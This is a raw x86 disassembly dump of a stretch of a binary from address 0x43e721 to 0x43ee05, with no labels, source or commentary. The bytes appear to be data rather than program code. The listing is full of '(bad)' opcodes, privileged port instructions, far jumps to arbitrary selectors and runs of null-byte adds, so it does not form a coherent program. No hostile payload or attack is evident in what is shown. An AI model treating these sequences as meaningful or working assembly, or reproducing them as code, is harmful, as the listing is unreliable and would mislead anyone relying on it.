  43e721:	sbb    DWORD PTR [ebx+0x2d],edx
  43e724:	add    BYTE PTR [eax],al
  43e726:	add    BYTE PTR [eax],al
  43e728:	add    BYTE PTR [ebp+0x2],ah
  43e72b:	pusha  
  43e72c:	add    al,0x31
  43e72e:	daa    
  43e72f:	inc    ecx
  43e730:	dec    edi
  43e731:	cmp    DWORD PTR [ebx],edi
  43e733:	add    BYTE PTR [edx],ch
  43e735:	cdq    
  43e736:	and    eax,0x1c29456c
  43e73b:	imul   ecx,DWORD PTR [edx],0x82000220
  43e741:	jns    0x43e789
  43e743:	arpl   WORD PTR [edi],cx
  43e745:	inc    eax
  43e746:	and    eax,0x3350056a
  43e74b:	push   eax
  43e74c:	sti    
  43e74d:	dec    ecx
  43e74e:	dec    edi
  43e74f:	aas    
  43e750:	jmp    0x1b4220cb
  43e755:	push   edx
  43e756:	and    esp,DWORD PTR [edi-0x6]
  43e759:	dec    edx
  43e75a:	and    DWORD PTR [esi-0x56],ebp
  43e75d:	dec    edx
  43e75e:	dec    ebp
  43e75f:	ins    DWORD PTR es:[edi],dx
  43e760:	fidivr DWORD PTR [ebx+0x76e9512a]
  43e766:	in     al,0xfd
  43e768:	popf   
  43e769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e76a:	pop    ds
  43e76b:	push   0xffffffb0
  43e76d:	mov    BYTE PTR [edx],dh
  43e76f:	jae    0x43e726
  43e771:	mov    edx,0x82c26d1f
  43e776:	sbb    DWORD PTR [eax-0x17],esi
  43e779:	jbe    0x43e70b
  43e77b:	jmp    FWORD PTR [ebx+edx*4+0x579b4220]
  43e782:	pop    ss
  43e783:	arpl   WORD PTR [ecx-0x57a2e69c],di
  43e789:	jbe    0x43e71a
  43e78b:	jmp    FWORD PTR [eax+eax*1+0x0]
  43e792:	push   ebx
  43e793:	and    BYTE PTR [ebp+ecx*4+0x59],al
  43e797:	push   edx
  43e798:	outs   dx,BYTE PTR ds:[esi]
  43e799:	xchg   BYTE PTR [ebp+0x51],dl
  43e79c:	add    BYTE PTR [ebp+0x4e633c74],bl
  43e7a2:	dec    esi
  43e7a3:	sbb    eax,0xeda74474
  43e7a8:	imul   ecx,DWORD PTR [eax-0x5c],0x1d
  43e7ac:	inc    ebx
  43e7ad:	push   ecx
  43e7ae:	add    al,BYTE PTR ss:[eax]
  43e7b1:	add    BYTE PTR ds:0x88653eff,dh
  43e7b7:	push   ecx
  43e7b8:	push   0x4ef23065
  43e7bd:	imul   eax,DWORD PTR [edx-0x33889926],0x5900d2ff
  43e7c7:	fsub   QWORD PTR [ebx+0x4d]
  43e7ca:	jns    0x43e7a8
  43e7cc:	ins    BYTE PTR es:[edi],dx
  43e7cd:	add    BYTE PTR [esi],dh
  43e7cf:	add    BYTE PTR [eax+0x69],cl
  43e7d2:	adc    bh,0x73
  43e7d5:	gs popa 
  43e7d7:	jecxz  0x43e83e
  43e7d9:	jne    0x43e830
  43e7db:	jmp    0x148:0xff8c6d5c
  43e7e2:	retf   
  43e7e3:	in     al,0x73
  43e7e5:	dec    ebp
  43e7e6:	cmp    ebp,ebx
  43e7e8:	ins    BYTE PTR es:[edi],dx
  43e7e9:	dec    ecx
  43e7ea:	dec    eax
  43e7eb:	in     al,0x64
  43e7ed:	inc    ebx
  43e7ee:	and    esi,esp
  43e7f0:	gs je  0x43e83f
  43e7f3:	dec    DWORD PTR [ebp+0x1]
  43e7f6:	add    BYTE PTR [eax],al
  43e7f8:	add    BYTE PTR [eax],al
  43e7fa:	add    BYTE PTR [ebx],bl
  43e7fc:	in     al,0x73
  43e7fe:	dec    ebp
  43e7ff:	cmp    ebp,ebx
  43e801:	ins    BYTE PTR es:[edi],dx
  43e802:	push   ebx
  43e803:	or     al,ah
  43e805:	jae    0x43e86c
  43e807:	dec    esp
  43e808:	dec    DWORD PTR [ecx]
  43e80a:	add    ebx,ebx
  43e80c:	jecxz  0x43e881
  43e80e:	inc    ebx
  43e80f:	lock fild QWORD PTR [edx+0x73]
  43e813:	add    ah,al
  43e815:	fs gs sti 
  43e818:	(bad)  
  43e819:	jmp    0x43e81d
  43e81b:	out    dx,eax
  43e81c:	out    0x6a,eax
  43e81e:	je     0x43e819
  43e820:	fisttp DWORD PTR [edi+0x61]
  43e823:	jle    0x43e805
  43e825:	fs gs cwde 
  43e828:	loope  0x43e893
  43e82a:	jae    0x43e7d1
  43e82c:	fcomp  DWORD PTR [ebp+0x6f]
  43e82f:	jne    0x43e81d
  43e831:	add    esi,ecx
  43e833:	ja     0x43e82a
  43e835:	xor    DWORD PTR [edi+0x56],ebx
  43e838:	push   eax
  43e839:	push   esp
  43e83a:	imul   eax,DWORD PTR [ebp-0xa],0x43504b33
  43e841:	das    
  43e842:	inc    ebx
  43e843:	cmp    eax,0x7452fc99
  43e848:	fcomp  QWORD PTR [esi]
  43e84a:	je     0x43e88c
  43e84c:	push   es
  43e84d:	es jae 0x43e88c
  43e850:	or     eax,0x6476b1f
  43e855:	and    DWORD PTR [ebp+esi*2-0x10],esi
  43e859:	add    al,BYTE PTR [ecx+0x18]
  43e85c:	mov    ch,0x47
  43e85e:	arpl   WORD PTR [eax],ax
  43e860:	add    BYTE PTR [eax],al
  43e862:	add    BYTE PTR [eax],al
  43e864:	sbb    ebp,DWORD PTR [esi+0xe7705fc]
  43e86a:	pop    ds
  43e86b:	push   0x0
  43e86d:	jb     0x43e897
  43e86f:	arpl   ax,sp
  43e871:	popa   
  43e872:	xor    ch,BYTE PTR [ecx-0x28]
  43e875:	imul   esp,DWORD PTR ds:0xfccfd367,0x75
  43e87c:	je     0x43e8d6
  43e87e:	pop    ds
  43e87f:	je     0x43e827
  43e881:	outs   dx,BYTE PTR ds:[esi]
  43e882:	and    cl,BYTE PTR [ebx-0x30]
  43e885:	shr    DWORD PTR [edi],0x0
  43e888:	jne    0x43e8db
  43e88a:	add    cl,BYTE PTR [ebp-0x30]
  43e88d:	xchg   DWORD PTR [ecx+0x63],ecx
  43e890:	lods   al,BYTE PTR ds:[esi]
  43e891:	jge    0x43e8b8
  43e893:	pop    edi
  43e894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e895:	ja     0x43e8e8
  43e897:	je     0x43e82d
  43e899:	(bad)  
  43e89a:	pop    ds
  43e89b:	add    BYTE PTR [ebp-0x73],dh
  43e89e:	add    eax,DWORD PTR [ecx-0x68]
  43e8a1:	das    
  43e8a2:	dec    eax
  43e8a3:	arpl   WORD PTR [ebx-0x678bb3da],bx
  43e8a9:	es dec esp
  43e8ab:	inc    esp
  43e8ac:	jne    0x43e8b0
  43e8ae:	inc    esi
  43e8af:	push   es
  43e8b0:	inc    ebx
  43e8b1:	pop    ds
  43e8b2:	inc    edx
  43e8b3:	sub    eax,0x364c2e58
  43e8b8:	inc    esp
  43e8b9:	sbb    edi,DWORD PTR [ecx]
  43e8bb:	and    BYTE PTR [ecx+esi*1+0x34],cl
  43e8bf:	and    DWORD PTR [eax+0x35],esp
  43e8c2:	dec    eax
  43e8c3:	and    edx,DWORD PTR [esi+0x51]
  43e8c6:	out    0x3,eax
  43e8c8:	add    BYTE PTR [eax],al
  43e8ca:	add    BYTE PTR [eax],al
  43e8cc:	add    BYTE PTR [esi],ah
  43e8ce:	push   ebp
  43e8cf:	and    al,0x56
  43e8d1:	mov    ah,dh
  43e8d3:	rcr    BYTE PTR [edi],1
  43e8d5:	and    DWORD PTR [esi],edx
  43e8d7:	out    0x3,eax
  43e8d9:	mov    DWORD PTR [edx],0x322a3626
  43e8df:	adc    edx,DWORD PTR [edx+0x16]
  43e8e2:	xor    al,0x10
  43e8e4:	and    cl,BYTE PTR [edx]
  43e8e6:	push   ebp
  43e8e7:	adc    BYTE PTR [ebx],ah
  43e8e9:	pop    ds
  43e8ea:	and    edi,ebx
  43e8ec:	xor    BYTE PTR [ebx],dl
  43e8ee:	pop    ds
  43e8ef:	adc    al,BYTE PTR [esi+esi*4]
  43e8f2:	add    ah,BYTE PTR [esi-0x2ccd15cb]
  43e8f8:	inc    edx
  43e8f9:	(bad)  
  43e8fa:	cs sahf 
  43e8fc:	and    dl,ch
  43e8fe:	push   edx
  43e8ff:	enter  0xba35,0x17
  43e903:	out    0x3,eax
  43e905:	cmp    eax,DWORD PTR [edx]
  43e907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e908:	xor    eax,0x4cbb32c2
  43e90d:	into   
  43e90e:	xor    bh,BYTE PTR [edx-0x73c23ecb]
  43e914:	cmp    al,0x75
  43e916:	add    dl,BYTE PTR [edx+0x3]
  43e919:	push   0xa9339034
  43e91e:	test   BYTE PTR ds:[esi],dh
  43e921:	mov    eax,ds:0xb83c9234
  43e926:	pop    ds
  43e927:	add    BYTE PTR [ebx],0xc7
  43e92a:	add    DWORD PTR [eax],eax
  43e92c:	stos   BYTE PTR es:[edi],al
  43e92d:	dec    eax
  43e92e:	xor    DWORD PTR [eax+0x75],esi
  43e931:	add    BYTE PTR [eax],al
  43e933:	add    BYTE PTR [eax],al
  43e935:	add    BYTE PTR [edx],bh
  43e937:	and    eax,0x1bab5d6d
  43e93c:	ja     0x43e96f
  43e93e:	xchg   esi,eax
  43e93f:	pop    ss
  43e940:	push   0xff0376e9
  43e945:	and    esp,DWORD PTR [esi+0x28555f35]
  43e94b:	and    DWORD PTR [ecx+ebp*8+0x76],esp
  43e94f:	icebp  
  43e950:	std    
  43e951:	sbb    ah,BYTE PTR [edx+0x23]
  43e954:	cmp    eax,0x74495a3b
  43e959:	or     al,0x40
  43e95b:	and    eax,0x53692477
  43e960:	add    cl,bl
  43e962:	js     0x43e99c
  43e964:	arpl   WORD PTR [esi],ax
  43e966:	xor    BYTE PTR [esi],dl
  43e968:	imul   edi,edx,0x633f73
  43e96e:	jno    0x43e9c0
  43e970:	jmp    FWORD PTR ds:0xfe542e62
  43e976:	dec    ecx
  43e977:	and    eax,0x249cb06a
  43e97c:	imul   ebx,ebx,0xc0744793
  43e982:	lea    ebx,[eax+eax*1]
  43e985:	(bad)  
  43e986:	ja     0x43e9c7
  43e988:	push   0xffffffd0
  43e98a:	mov    ds:0x9fcd5f1f,al
  43e98f:	xor    BYTE PTR [ebx-0x66],ah
  43e992:	arpl   WORD PTR [ebp+0x73],ax
  43e995:	mov    ebx,0xad772e8f
  43e99a:	add    BYTE PTR [eax],al
  43e99c:	add    BYTE PTR [eax],al
  43e99e:	add    BYTE PTR [ebx+0x5f9b5d15],dl
  43e9a4:	xor    dh,BYTE PTR [esi+eax*4+0x68]
  43e9a8:	add    al,BYTE PTR [eax]
  43e9aa:	push   edi
  43e9ab:	jae    0x43e9e2
  43e9ad:	arpl   WORD PTR [eax],ax
  43e9af:	nop
  43e9b0:	dec    esi
  43e9b1:	pop    ebp
  43e9b2:	arpl   WORD PTR [ecx-0x7a8b9f13],ax
  43e9b8:	out    0x5c,eax
  43e9ba:	jae    0x43e9ab
  43e9bc:	in     eax,dx
  43e9bd:	pusha  
  43e9be:	jo     0x43ea10
  43e9c0:	fldcw  WORD PTR [ecx+0x44]
  43e9c3:	cmp    eax,0x3e006bdd
  43e9c8:	(bad)  
  43e9c9:	cmp    ch,BYTE PTR [edi-0x66]
  43e9cc:	hlt    
  43e9cd:	pop    esp
  43e9ce:	jb     0x43e960
  43e9d0:	dec    ebp
  43e9d1:	je     0x43ea45
  43e9d3:	and    eax,0x31535edc
  43e9d8:	(bad)  [edx+esi*2+0x35]
  43e9dc:	bnd jo 0x43ea23
  43e9df:	sub    ebp,0xee85725a
  43e9e5:	jae    0x43ea56
  43e9e7:	jle    0x43ea3b
  43e9e9:	addr16 push ebx
  43e9eb:	jno    0x43e9ca
  43e9ed:	ins    BYTE PTR es:[edi],dx
  43e9ee:	jb     0x43ea55
  43e9f0:	bnd jo 0x43ea37
  43e9f3:	jno    0x43e9e2
  43e9f5:	pop    edx
  43e9f6:	jb     0x43ea6d
  43e9f8:	out    dx,al
  43e9f9:	jae    0x43ea6a
  43e9fb:	jle    0x43ea4f
  43e9fd:	add    BYTE PTR [eax],al
  43e9ff:	sub    DWORD PTR [edi+edi*1],eax
  43ea02:	add    BYTE PTR gs:[eax],al
  43ea05:	add    BYTE PTR [eax],al
  43ea07:	add    BYTE PTR [eax+0x4e],al
  43ea0a:	pop    ebp
  43ea0b:	arpl   WORD PTR [ecx-0x13],ax
  43ea0e:	pusha  
  43ea0f:	je     0x43ea56
  43ea11:	out    0x5c,eax
  43ea13:	jae    0x43ea54
  43ea15:	in     eax,dx
  43ea16:	pusha  
  43ea17:	jo     0x43ea19
  43ea19:	fisubr DWORD PTR [ecx+0x53]
  43ea1c:	sub    eax,0xc6006bde
  43ea21:	std    
  43ea22:	dec    edx
  43ea23:	adc    BYTE PTR gs:[esi+0x5d],cl
  43ea27:	arpl   WORD PTR [ecx],ax
  43ea29:	in     eax,dx
  43ea2a:	pusha  
  43ea2b:	je     0x43eaa2
  43ea2d:	xchg   edx,eax
  43ea2e:	cmp    BYTE PTR [ebx-0x5a],ah
  43ea31:	jl     0x43ea65
  43ea33:	test   DWORD PTR [di],esp
  43ea36:	sub    BYTE PTR [esi-0x5a],ch
  43ea39:	jp     0x43ea5e
  43ea3b:	ins    BYTE PTR es:[edi],dx
  43ea3c:	jne    0x43eabd
  43ea3e:	add    cl,BYTE PTR [esi-0x70]
  43ea41:	or     BYTE PTR [ebp+0x73],0x58
  43ea45:	dec    ebx
  43ea46:	cmp    edx,DWORD PTR [edx+0x54]
  43ea49:	xor    eax,0x5138632f
  43ea4e:	dec    ecx
  43ea4f:	add    BYTE PTR [ebp+0x3a],dh
  43ea52:	dec    BYTE PTR [ebp+0x58]
  43ea55:	cmp    BYTE PTR [ecx+0x70],al
  43ea58:	push   eax
  43ea59:	aaa    
  43ea5a:	inc    ebp
  43ea5b:	arpl   WORD PTR [esi+edx*8],di
  43ea5e:	cmp    edx,DWORD PTR [ecx+0x75]
  43ea61:	xlat   BYTE PTR ds:[ebx]
  43ea62:	std    
  43ea63:	dec    ebp
  43ea64:	sbb    al,bh
  43ea66:	dec    esp
  43ea67:	arpl   WORD PTR [ecx],sp
  43ea69:	out    dx,eax
  43ea6a:	and    ch,BYTE PTR [eax+eax*1+0x0]
  43ea6e:	add    BYTE PTR [eax],al
  43ea70:	add    BYTE PTR [eax],ch
  43ea72:	idiv   BYTE PTR [esi]
  43ea74:	js     0x43eab8
  43ea76:	cdq    
  43ea77:	cld    
  43ea78:	xor    DWORD PTR [eax+ebx*8+0x1e],esi
  43ea7c:	je     0x43eab7
  43ea7e:	(bad)  
  43ea7f:	and    DWORD PTR [ecx+0x9],esp
  43ea82:	add    DWORD PTR [ebp+0x67],ecx
  43ea85:	adc    DWORD PTR [ecx+0x6c74f0fc],ebx
  43ea8b:	sub    al,0x63
  43ea8d:	fld    TBYTE PTR [ebx+0x2e]
  43ea90:	imul   edx,esi,0xc16d2db6
  43ea96:	fs and eax,0xfc9be363
  43ea9c:	push   eax
  43ea9d:	je     0x43eafb
  43ea9f:	pop    ds
  43eaa0:	je     0x43ea48
  43eaa2:	ret    0x4d18
  43eaa5:	sar    BYTE PTR [ecx+0x2a97343],0x8f
  43eaac:	es fwait
  43eaae:	sbb    edx,DWORD PTR [ebx+0x1302753c]
  43eab4:	add    eax,0x258432ac
  43eab9:	test   eax,0xaa20751a
  43eabe:	push   ds
  43eabf:	xchg   ebx,eax
  43eac0:	es cwde 
  43eac2:	pop    ds
  43eac3:	add    DWORD PTR [ebx],0x20a2039d
  43eac9:	imul   edx,DWORD PTR [ecx+0x50],0x452f3820
  43ead0:	inc    ebp
  43ead1:	data16 cs aas 
  43ead4:	daa    
  43ead5:	add    BYTE PTR [eax],al
  43ead7:	add    BYTE PTR [eax],al
  43ead9:	add    BYTE PTR [ebx+0x1b],cl
  43eadc:	push   ebx
  43eadd:	cmp    eax,0x263c1590
  43eae2:	inc    ecx
  43eae3:	add    bh,BYTE PTR [ebx]
  43eae5:	add    al,0x80
  43eae7:	xor    BYTE PTR [ebp+eiz*1+0x41],cl
  43eaeb:	pop    ds
  43eaec:	pop    ss
  43eaed:	xor    bl,BYTE PTR [ecx+eiz*1]
  43eaf0:	or     al,0x33
  43eaf2:	sbb    BYTE PTR [ebx+0x16],al
  43eaf5:	push   ecx
  43eaf6:	adc    BYTE PTR [edi],bl
  43eaf8:	adc    eax,0x7202754f
  43eafd:	add    al,0x41
  43eaff:	adc    eax,0x32062b12
  43eb04:	pop    ss
  43eb05:	xor    bl,BYTE PTR [edx]
  43eb07:	sub    al,0x0
  43eb09:	sub    BYTE PTR [esi],dl
  43eb0b:	sbb    eax,0x16d24e04
  43eb10:	fsub   QWORD PTR [eax]
  43eb12:	les    eax,FWORD PTR [edx]
  43eb14:	cli    
  43eb15:	add    esp,DWORD PTR [edx-0x37cf42e2]
  43eb1b:	cs mov bl,0x26
  43eb1e:	fcomp  DWORD PTR [edi]
  43eb20:	rcl    DWORD PTR [ebx-0x25],1
  43eb23:	sbb    esi,DWORD PTR [ecx+0x1fd12c]
  43eb29:	into   
  43eb2a:	xchg   ebp,eax
  43eb2b:	pop    ss
  43eb2c:	add    BYTE PTR [ecx+edi*2+0x5a906a3d],ch
  43eb33:	sbb    eax,0x3755955f
  43eb38:	ja     0x43ead4
  43eb3a:	dec    edx
  43eb3b:	and    DWORD PTR [ebx-0x46],ebp
  43eb3e:	add    BYTE PTR [eax],al
  43eb40:	add    BYTE PTR [eax],al
  43eb42:	add    BYTE PTR [esi+0x31],bl
  43eb45:	je     0x43ead4
  43eb47:	push   ebx
  43eb48:	xor    ebp,DWORD PTR [edx-0x5c]
  43eb4b:	ds push ebx
  43eb4d:	add    BYTE PTR ds:0x706de776,ch
  43eb53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eb54:	cs inc ecx
  43eb56:	dec    esp
  43eb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eb58:	cmp    bl,BYTE PTR [edi+0x5a]
  43eb5b:	xchg   ecx,eax
  43eb5c:	push   edx
  43eb5d:	pop    edi
  43eb5e:	pop    ebx
  43eb5f:	xchg   esi,eax
  43eb60:	sbb    DWORD PTR [eax],eax
  43eb62:	cwde   
  43eb63:	jns    0x43eb4c
  43eb65:	ins    DWORD PTR es:[edi],dx
  43eb66:	inc    eax
  43eb67:	sub    DWORD PTR [esi],0x31864a3f
  43eb6d:	cmp    ebx,DWORD PTR [bp+si-0x19]
  43eb71:	push   0x7821653f
  43eb76:	sbb    eax,0xb2000238
  43eb7b:	jns    0x43eb64
  43eb7d:	ins    DWORD PTR es:[edi],dx
  43eb7e:	adc    BYTE PTR [ecx+0x2e],ah
  43eb81:	dec    esi
  43eb82:	add    al,0x5d
  43eb84:	and    DWORD PTR [edi-0x6],ebx
  43eb87:	imul   esp,edi,0x68
  43eb8a:	cmovne esp,DWORD PTR [ecx]
  43eb8d:	js     0x43eb8c
  43eb8f:	jbe    0x43ebe8
  43eb91:	jmp    FWORD PTR [ecx]
  43eb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eb94:	sub    esi,DWORD PTR [eax-0x23]
  43eb97:	mov    ch,0x14
  43eb99:	arpl   ax,cx
  43eb9b:	xchg   edx,eax
  43eb9c:	pop    ds
  43eb9d:	dec    eax
  43eb9e:	enter  0x1aa5,0x0
  43eba2:	and    DWORD PTR [ecx-0x1b],edi
  43eba5:	ins    DWORD PTR es:[edi],dx
  43eba6:	add    BYTE PTR [eax],al
  43eba8:	add    BYTE PTR [eax],al
  43ebaa:	add    BYTE PTR [eax],al
  43ebac:	xor    eax,0x2d4873f0
  43ebb1:	repz addr16 inc esp
  43ebb4:	sub    eax,0x9b0058d4
  43ebb9:	inc    DWORD PTR [eax+0x73]
  43ebbc:	jmp    0x43ebc2
  43ebbe:	ins    BYTE PTR es:[edi],dx
  43ebbf:	ins    BYTE PTR es:[edi],dx
  43ebc0:	out    0xdd,eax
  43ebc2:	data16 ja 0x43ebb7
  43ebc5:	push   edx
  43ebc6:	popa   
  43ebc7:	fs sbb al,0x0
  43ebca:	ins    BYTE PTR es:[edi],dx
  43ebcb:	add    bh,bl
  43ebcd:	fisub  WORD PTR [ebp+0x76]
  43ebd0:	stc    
  43ebd1:	icebp  
  43ebd2:	jae    0x43ec27
  43ebd4:	cmc    
  43ebd5:	add    edx,DWORD PTR [edi+ebp*2+0xf]
  43ebd9:	aam    0x69
  43ebdb:	imul   eax,DWORD PTR [edx+0x5],0x3538694b
  43ebe2:	add    BYTE PTR [eax],al
  43ebe4:	lea    eax,[edx+0x4e]
  43ebe7:	inc    ecx
  43ebe8:	mov    WORD PTR [edi],?
  43ebea:	sub    esi,DWORD PTR [edx]
  43ebec:	(bad)  
  43ebee:	imul   ebp,DWORD PTR [esp+ecx*8-0x1],0x4c
  43ebf3:	add    BYTE PTR [edi+ebx*8+0x73],bl
  43ebf7:	push   0x4474035b
  43ebfc:	mov    ss,edi
  43ebfe:	ins    DWORD PTR es:[edi],dx
  43ebff:	gs push edx
  43ec01:	shl    DWORD PTR [edx+eiz*2+0x69],cl
  43ec05:	lock dec esi
  43ec07:	add    BYTE PTR [edi],dl
  43ec09:	dec    DWORD PTR [edi+0x61]
  43ec0c:	mov    bh,dl
  43ec0e:	dec    ecx
  43ec0f:	add    BYTE PTR gs:[eax],al
  43ec12:	add    BYTE PTR [eax],al
  43ec14:	add    BYTE PTR [ecx-0x23],dh
  43ec17:	ins    DWORD PTR es:[edi],dx
  43ec18:	gs dec edx
  43ec1a:	xlat   BYTE PTR ds:[ebx]
  43ec1b:	imul   esp,DWORD PTR [ebp-0x71],0xffffffee
  43ec1f:	pop    esp
  43ec20:	arpl   WORD PTR [ebx],bp
  43ec22:	call   FWORD PTR [eax]
  43ec24:	add    DWORD PTR [edi],ebx
  43ec26:	shr    DWORD PTR [ecx+0x43],cl
  43ec29:	jne    0x43ebe9
  43ec2b:	sub    al,0x4a
  43ec2d:	mov    esp,0x741dfc6c
  43ec32:	mov    BYTE PTR [eax],ch
  43ec34:	outs   dx,BYTE PTR ds:[esi]
  43ec35:	mov    dh,0xb6
  43ec37:	sub    al,0x4a
  43ec39:	mov    ds:0x7578fc99,al
  43ec3e:	mov    DWORD PTR ds:0x296a9d74,ebx
  43ec44:	imul   ebp,DWORD PTR [ecx-0x6b8fb082],0xaa6d1978
  43ec4e:	cdq    
  43ec4f:	cld    
  43ec50:	gs je  0x43ebd9
  43ec53:	cs ins BYTE PTR es:[edi],dx
  43ec55:	test   al,0x73
  43ec57:	sbb    DWORD PTR [ebp-0x6a],ebp
  43ec5a:	jp     0x43ec88
  43ec5c:	arpl   WORD PTR [ecx+ebx*4],si
  43ec5f:	cld    
  43ec60:	sbb    DWORD PTR [eax+ebp*8+0x37],esi
  43ec64:	outs   dx,BYTE PTR ds:[esi]
  43ec65:	ss ss xor al,0x4a
  43ec69:	sub    al,0xda
  43ec6b:	add    esi,DWORD PTR [eax]
  43ec6d:	jne    0x43ec58
  43ec6f:	and    dh,BYTE PTR [ebp+ebx*2-0x26]
  43ec73:	daa    
  43ec74:	fs aaa 
  43ec76:	cmp    ah,BYTE PTR [ecx]
  43ec78:	add    BYTE PTR gs:[eax],al
  43ec7b:	add    BYTE PTR [eax],al
  43ec7d:	add    BYTE PTR [esi+0x3d],al
  43ec80:	and    ebp,DWORD PTR [ebp+0x1d]
  43ec83:	or     al,0x4
  43ec85:	xor    DWORD PTR [ebp-0x17],0x22
  43ec89:	je     0x43ec98
  43ec8b:	out    0x26,eax
  43ec8d:	imul   ecx,DWORD PTR [edx],0x3
  43ec90:	daa    
  43ec91:	ds adc al,0xf8
  43ec94:	sbb    BYTE PTR [ebp+0x19],ch
  43ec97:	cli    
  43ec98:	xor    BYTE PTR [eax+0x2a],ch
  43ec9b:	cdq    
  43ec9c:	cld    
  43ec9d:	mov    al,0x75
  43ec9f:	or     BYTE PTR [esp+eax*2],bh
  43eca2:	fcomp  DWORD PTR [edi+0x2d07427]
  43eca8:	mov    ecx,0xc417d124
  43ecad:	pop    edx
  43ecae:	jne    0x43ecb2
  43ecb0:	xchg   esi,eax
  43ecb1:	add    al,0xc0
  43ecb3:	dec    edx
  43ecb4:	mov    ds:0xbb27d928,eax
  43ecb9:	sub    BYTE PTR [eax+0x755ac027],bh
  43ecbf:	add    ch,BYTE PTR [esi-0x4cdc3afd]
  43ecc5:	sbb    edi,DWORD PTR [esi-0x72d964dd]
  43eccb:	xor    eax,0x39b82897
  43ecd0:	out    0x3,eax
  43ecd2:	mov    ah,0x2
  43ecd4:	mov    bh,0x24
  43ecd6:	sub    DWORD PTR [edx],0x268f1ca9
  43ecdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ecdd:	sub    eax,DWORD PTR [ecx+0x368127]
  43ece3:	add    BYTE PTR [eax],al
  43ece5:	add    BYTE PTR [eax],al
  43ece7:	pop    edx
  43ece8:	xor    DWORD PTR [ecx+0x5a],edi
  43eceb:	jne    0x43ecef
  43eced:	xor    BYTE PTR [eax*2+0x371c5323],al
  43ecf4:	sub    eax,DWORD PTR [ecx+0x28]
  43ecf7:	aaa    
  43ecf8:	sub    edi,DWORD PTR [ebx]
  43ecfa:	sub    DWORD PTR [edi],edi
  43ecfc:	and    edx,DWORD PTR [ecx+ebp*1+0x24]
  43ed00:	add    bl,dh
  43ed02:	add    al,0x28
  43ed04:	push   ss
  43ed05:	xor    eax,0x19121e47
  43ed0a:	inc    ebp
  43ed0b:	jne    0x43ed0f
  43ed0d:	pop    ss
  43ed0e:	add    eax,0x37091824
  43ed13:	and    eax,0x9220014
  43ed18:	sub    BYTE PTR [edx],dh
  43ed1a:	add    al,0x1c
  43ed1c:	add    edi,edx
  43ed1e:	cmp    DWORD PTR [edi],ecx
  43ed20:	adc    eax,0x301235f7
  43ed25:	add    ch,bh
  43ed27:	pushf  
  43ed28:	loope  0x43ed29
  43ed2a:	stc    
  43ed2b:	jbe    0x43ed5f
  43ed2d:	pop    edi
  43ed2e:	fnstsw WORD PTR [esi+0x49]
  43ed31:	ins    DWORD PTR es:[edi],dx
  43ed32:	mov    ah,0xc0
  43ed34:	dec    esi
  43ed35:	push   ecx
  43ed36:	jmp    0xb94424b1
  43ed3b:	xchg   ecx,eax
  43ed3c:	push   ss
  43ed3d:	push   0x67468bb0
  43ed42:	mov    ebx,0xc6743f8d
  43ed47:	push   0xe95119
  43ed4c:	add    BYTE PTR [eax],al
  43ed4e:	add    BYTE PTR [eax],al
  43ed50:	jbe    0x43ed42
  43ed52:	(bad)  
  43ed53:	mov    eax,0xa8681659
  43ed58:	push   edx
  43ed59:	es inc ebx
  43ed5b:	xchg   ecx,eax
  43ed5c:	dec    edx
  43ed5d:	and    eax,0x2b699a6a
  43ed62:	push   0xffffff9e
  43ed64:	jbe    0x43ed3a
  43ed66:	(bad)  
  43ed67:	cdq    
  43ed68:	inc    edx
  43ed69:	xor    BYTE PTR [esi-0x56],cl
  43ed6c:	mov    ?,WORD PTR [eax]
  43ed6e:	aas    
  43ed6f:	jmp    0x3a42e6ea
  43ed74:	popf   
  43ed75:	xor    BYTE PTR ds:0x5149a14c,bh
  43ed7b:	jmp    0x3a42e3f6
  43ed80:	lea    esi,[eax]
  43ed82:	cmp    eax,0x338b51
  43ed87:	out    dx,al
  43ed88:	ja     0x43edd9
  43ed8a:	je     0x43edc7
  43ed8c:	cmp    BYTE PTR [edx],ch
  43ed8e:	outs   dx,BYTE PTR ds:[esi]
  43ed8f:	sub    BYTE PTR [ecx-0x71],dh
  43ed92:	(bad)  
  43ed93:	cmp    BYTE PTR [esi+0x16],dl
  43ed96:	push   0x7029783a
  43ed9b:	cmp    edx,DWORD PTR [ebx+ebp*1+0x74]
  43ed9f:	ss jno 0x43ee1d
  43eda2:	(bad)  
  43eda3:	call   FWORD PTR [ebp+eiz*8+0x73]
  43eda7:	push   0x7568e461
  43edac:	jnp    0x43ed88
  43edae:	pop    esp
  43edaf:	push   ebx
  43edb0:	ins    BYTE PTR es:[edi],dx
  43edb1:	in     eax,0x5a
  43edb3:	add    BYTE PTR gs:[eax],al
  43edb6:	add    BYTE PTR [eax],al
  43edb8:	add    BYTE PTR [edi],bh
  43edba:	cmp    eax,DWORD PTR [eax]
  43edbc:	add    BYTE PTR [edi],bl
  43edbe:	fmul   QWORD PTR [ebx+0x57]
  43edc1:	sbb    eax,0x302e4134
  43edc6:	add    BYTE PTR [eax+eax*1-0x71],ch
  43edca:	push   es
  43edcb:	dec    ebx
  43edcc:	dec    eax
  43edcd:	adc    ebp,ecx
  43edcf:	jae    0x43ee17
  43edd1:	cmp    eax,DWORD PTR [eax]
  43edd3:	fs gs out dx,al
  43edd6:	xor    ebx,DWORD PTR [ecx+0x74]
  43edd9:	add    al,0x3b
  43eddb:	add    BYTE PTR [eax],al
  43eddd:	adc    al,BYTE PTR [ebx+edi*1]
  43ede0:	outs   dx,DWORD PTR ds:[esi]
  43ede1:	stc    
  43ede2:	add    BYTE PTR [ecx+0x6e],bl
  43ede5:	lock fbld TBYTE PTR [eax+0x6e]
  43ede9:	icebp  
  43edea:	aaa    
  43edeb:	addr16 inc ecx
  43eded:	jle    0x43edd9
  43edef:	ins    DWORD PTR es:[edi],dx
  43edf0:	push   edi
  43edf1:	fadd   QWORD PTR [ebx]
  43edf3:	sbb    al,BYTE PTR [ecx]
  43edf5:	paddb  mm3,QWORD PTR [esp+ebp*2+0x48]
  43edfa:	inc    edi
  43edfb:	js     0x43ee62
  43edfd:	das    
  43edfe:	xlat   BYTE PTR ds:[ebx]
  43edff:	jae    0x43ee66
  43ee01:	xchg   ebx,eax
  43ee02:	push   es
  43ee03:	dec    ebx
  43ee04:	dec    eax
  43ee05:	xchg   ecx,eax
